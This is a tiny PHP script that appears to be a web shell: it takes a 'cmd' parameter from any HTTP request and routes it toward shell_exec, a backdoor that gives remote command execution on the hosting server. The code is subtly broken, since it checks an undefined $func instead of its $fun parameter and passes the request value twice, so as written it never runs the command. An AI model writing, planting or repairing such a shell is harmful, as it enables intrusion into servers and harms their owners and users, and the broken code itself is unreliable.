<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	
	if ($func == "shell_exec") { $res = @shell_exec($cmd); }
	return $res;
}

if (isset($_REQUEST['cmd']))
	do_phpfun($_REQUEST['cmd'], $_REQUEST['cmd']);
?>